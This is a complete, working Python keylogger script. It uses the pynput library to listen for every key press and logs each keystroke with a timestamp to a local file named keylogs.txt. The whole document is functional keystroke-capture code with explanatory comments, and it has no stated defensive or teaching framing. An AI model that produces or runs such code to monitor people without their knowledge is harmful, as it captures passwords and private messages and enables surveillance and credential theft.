#############################################
# Import packages
import logging
from pynput import keyboard
#############################################
# Directory where the log file will be stored
LOG_DIRECTORY = ""
#############################################
# All key presses will be written into keylogs.txt with timestamps
logging.basicConfig(
    filename=LOG_DIRECTORY + "keylogs.txt",
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)
#############################################
def handle_key_press(key):
    # The key is converted to string form and written to the log file
    logging.info(str(key))
#############################################
# Create a keyboard listener that listens for key press events
with keyboard.Listener(on_press=handle_key_press) as listener:
    # Keeps the script running so it continues listening for input
    listener.join()
#############################################
